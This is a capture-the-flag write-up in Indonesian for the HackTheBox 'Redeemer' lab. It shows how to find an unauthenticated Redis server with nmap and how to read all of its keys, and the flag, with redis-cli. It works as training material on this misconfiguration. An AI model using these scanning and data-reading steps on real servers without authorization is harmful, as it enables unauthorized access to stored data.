# Redeemer — Unauthenticated Redis Access

**Date:** 2026-05-02
**Platform:** HackTheBox (Starting Point)
**Difficulty:** Very Easy
**Category:** Network / Database

---

## Target

Mesin Linux dengan Redis server yang berjalan tanpa autentikasi. Redis adalah in-memory key-value store yang sering digunakan sebagai database cache. Pada kasus ini, server tidak dikonfigurasi dengan password sehingga siapapun yang terhubung ke jaringan bisa mengakses seluruh isi database secara langsung.

## Vulnerability

Redis misconfiguration — server berjalan tanpa password (no authentication required). Siapapun yang bisa menjangkau port 6379 dapat konek langsung, membaca semua keys, dan mengambil data sensitif di dalamnya.

## Tools Used

- Nmap (port scanning & service detection)
- redis-cli (interaksi langsung dengan Redis server)

---

## Exploitation Steps

### Step 1 — Port Scanning

Scan semua port untuk menemukan service yang berjalan di target.

```bash
nmap -p- --min-rate 5000 10.129.8.170
```

Flag yang dipakai:
- `-p-` → scan semua port (1-65535)
- `--min-rate 5000` → percepat scan dengan minimum 5000 paket/detik

Output menunjukkan port **6379** terbuka dengan service **Redis**.

---

### Step 2 — Koneksi ke Redis Server

Install redis-cli terlebih dahulu jika belum tersedia:

```bash
sudo apt install redis-tools
```

Konek ke Redis server menggunakan flag `-h` untuk menentukan host target:

```bash
redis-cli -h 10.129.8.170
```

Verifikasi koneksi berhasil:

```bash
ping
```

Server membalas `PONG` — koneksi aktif tanpa perlu autentikasi apapun.

---

### Step 3 — Enumerasi Server

Lihat informasi dan statistik lengkap server:

```bash
info
```

Dari output, fokus ke bagian `# Server` untuk melihat versi Redis, dan bagian `# Keyspace` untuk melihat database mana yang berisi data:

```
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

Artinya database index 0 menyimpan 4 keys.

---

### Step 4 — Akses Database dan Ambil Flag

Pilih database index 0:

```bash
select 0
```

Lihat jumlah keys yang ada:

```bash
dbsize
```

Tampilkan semua keys:

```bash
keys *
```

Ambil value dari key yang relevan:

```bash
get flag
```

---

## Proof

```
Flag: [flag didapat dari output perintah get flag]
```

---

## Lessons Learned

- Redis yang tidak dikonfigurasi password adalah celah kritis — siapapun bisa konek dan baca semua data hanya dengan redis-cli.
- Port 6379 adalah port default Redis, selalu jadi target saat scanning.
- Command `info` sangat berguna untuk enumeration awal — bisa lihat versi, OS, dan keyspace sekaligus.
- Perbedaan `keys *` dan `dbsize`: dbsize hanya hitung jumlah, keys * tampilkan semua nama key-nya.
- Redis punya 16 database (index 0-15), selalu cek Keyspace dulu untuk tahu database mana yang aktif berisi data.
- Misconfiguration seperti ini sering terjadi di dunia nyata, bukan hanya di CTF.